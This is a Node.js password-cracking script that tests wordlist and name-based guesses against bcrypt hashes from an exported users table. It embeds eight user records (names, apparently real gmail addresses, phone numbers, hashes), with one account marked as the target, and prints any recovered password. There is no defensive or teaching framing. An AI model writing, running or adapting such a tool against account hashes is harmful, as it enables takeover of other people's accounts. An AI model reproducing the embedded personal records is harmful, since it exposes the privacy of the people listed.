// Cross-account bcrypt recovery: tests candidates against ALL known hashes
// (from the users-table export) to detect shared password conventions.
// Usage: node bcrypt-recover3.js [wordlistFile ...] [maxGenericCount]
const bcrypt = require('bcrypt');
const fs = require('fs');

const USERS = [
  { label: 'takeleu / takeleuma@gmail.com', hash: '$2b$10$D5Vt65P1Fgq3pKpSNHmXMeRINeq6mOHPrF5IW0V//.GzjKV4VaF5y', first: 'takele', last: 'uma', user: 'takeleu', email: 'takeleuma@gmail.com', extra: ['0999000000'] },
  { label: 'fenetb / fenetbedada@gmail.com', hash: '$2b$10$vIIM3FqTLJ4kTkvSb22.0OoCcQs.CaNLspJZOQYL3UeSiHybYjRBm', first: 'fenet', last: 'bedada', user: 'fenetb', email: 'fenetbedada@gmail.com', extra: ['0994989535'] },
  { label: 'redwanj / redwanjemal@gmail.com', hash: '$2b$10$ZWPqro/Ycr3qHA4JR1yq6eCa0J49pnu4hMAhorhc/RvLD4oxvTn1y', first: 'redwan', last: 'jemal', user: 'redwanj', email: 'redwanjemal@gmail.com', extra: ['251994989535'] },
  { label: 'jonedoe / Jane.Doe1@example.com', hash: '$2b$10$lO7ETXdyuDz9hONMeqQaO.VModKOY5UxvdYr67LJAT6YuyNe1WTgW', first: 'jane', last: 'doe', user: 'jonedoe', email: 'jane.doe1@example.com', extra: ['251911234587'] },
  { label: 'janesdoe / Jane.Doe@example.com', hash: '$2b$10$i7UrjVZzkqQnOTV0GCG/0uXbLiZWLbsMCBTugzKk3CzgZCz91uzH6', first: 'jane', last: 'doe', user: 'janesdoe', email: 'jane.doe@example.com', extra: ['251911234567'] },
  { label: 'yerosanb / yerosanbedada365@gmail.com', hash: '$2b$10$4ZrVhHNmEzOBGEO93xAusOK5qsdHe4SYToAMsiIrv71tB9biSIRjS', first: 'yerosan', last: 'bedada', user: 'yerosanb', email: 'yerosanbedada365@gmail.com', extra: [] },
  { label: 'danielgd / danielgd@example.com  <== TARGET', hash: '$2b$10$P2Ku9CxDGjnLSLyVPTi43O1TsUbR7A2osyv0m4HfK.vmPfSkPNQCS', first: 'daniel', last: 'gelan', user: 'danielgd', email: 'danielgd@example.com', extra: ['251911234588'] },
  { label: 'adanecha / adanechabebe22@gmail.com', hash: '$2b$10$W1pNoihNNtyyyr9isHLR7.S06HhrSUcBOnURm28USnq3Pxc5o0Y0O', first: 'adanech', last: 'abebe', user: 'adanecha', email: 'adanechabebe22@gmail.com', extra: ['0900000000'] },
];

const SUFFIXES = ['', '1', '12', '123', '1234', '12345', '!', '@', '#', '@123', '!1', '123!', '2024', '2025', '2026', '@2024', '@2025', '@2026', '!', '88', '22', '01', '007', '123!@', '2023'];

function nameCandidates(u) {
  const out = new Set();
  const names = [u.first, u.last, u.user, u.first + u.last, u.first + '.' + u.last, u.first + '_' + u.last, u.email];
  const caps = (s) => s.charAt(0).toUpperCase() + s.slice(1);
  for (const n of names) {
    for (const s of SUFFIXES) {
      out.add(n + s);
      out.add(caps(n) + s);
      out.add(n.toUpperCase() + s);
    }
    out.add(caps(n));
    out.add(n.replace(/^./, (c) => c.toUpperCase()));
  }
  for (const e of u.extra) out.add(e);
  return [...out];
}

const args = process.argv.slice(2);
const maxGeneric = Number(args[args.length - 1]) > 0 ? Number(args.pop()) : 5000;
const files = args;

const generic = [];
for (const f of files) {
  try {
    for (const l of fs.readFileSync(f, 'utf8').split(/\r?\n/)) {
      const w = l.trim();
      if (w) generic.push(w);
    }
  } catch (e) {
    console.log('WARN: cannot read ' + f + ': ' + e.message);
  }
}
const genericUniq = [...new Set(generic)].slice(0, maxGeneric);

(async () => {
  const start = Date.now();
  const jobs = [];

  // Pass A: generic top candidates against ALL hashes
  for (const w of genericUniq) {
    for (const u of USERS) jobs.push({ w, u });
  }
  // Pass B: name-based candidates against own hash only
  const ownJobs = [];
  for (const u of USERS) {
    for (const w of nameCandidates(u)) ownJobs.push({ w, u });
  }

  let idx = 0;
  let checked = 0;
  let found = null;

  async function worker(list) {
    while (idx < list.length && !found) {
      const job = list[idx++];
      try {
        if (await bcrypt.compare(job.w, job.u.hash)) {
          if (!found) found = job;
          return;
        }
      } catch (e) { /* ignore */ }
      checked++;
      if (checked % 3000 === 0) {
        console.log('  ...' + checked + ' checked (' + ((Date.now() - start) / 1000).toFixed(0) + 's)');
      }
    }
  }

  idx = 0; checked = 0;
  await Promise.all(Array.from({ length: 6 }, () => worker(jobs)));
  console.log('Pass A (generic x all hashes): ' + jobs.length + ' tries done (' + ((Date.now() - start) / 1000).toFixed(0) + 's)');

  if (!found) {
    idx = 0; checked = 0;
    await Promise.all(Array.from({ length: 6 }, () => worker(ownJobs)));
    console.log('Pass B (name-based x own hash): ' + ownJobs.length + ' tries done');
  }

  if (found) {
    console.log('MATCH -> ' + found.u.label + ' PASSWORD: [' + found.w + ']');
    process.exit(0);
  } else {
    console.log('NO MATCH');
    process.exit(2);
  }
})();
